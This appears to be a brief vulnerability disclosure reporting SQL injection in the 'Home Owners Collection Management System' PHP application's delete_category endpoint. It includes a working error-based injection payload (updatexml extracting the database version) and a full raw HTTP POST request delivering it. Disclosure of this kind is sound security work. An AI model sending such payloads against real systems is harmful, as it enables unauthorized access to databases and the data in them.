## Home Owners Collection Management System has SQL injection vulnerability

vendor : https://www.sourcecodester.com/php/15162/home-owners-collection-management-system-phpoop-free-source-code.html

Vulnerability file: /hocms/classes/Master.php?f=delete_category

Vulnerability location: /hocms/classes/Master.php?f=delete_category,id

[+]Payload: id=1' and updatexml(1,concat(0x7e,(select version()),0x7e),0)--+ //id is Injection point

```
POST /hocms/classes/Master.php?f=delete_category HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 64
Origin: http://localhost
Connection: close
Referer: http://localhost/hocms/admin/?page=categories
Cookie: PHPSESSID=ci380ocmbq38avhpab7jrmslmf
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

id=3' and updatexml(1,concat(0x7e,(select version()),0x7e),0)--+
```
<img width="1242" alt="image" src="https://github.com/reverseD0G/cve/assets/158311992/c0f006c5-7a66-4bfe-bc38-d652655d76fd">


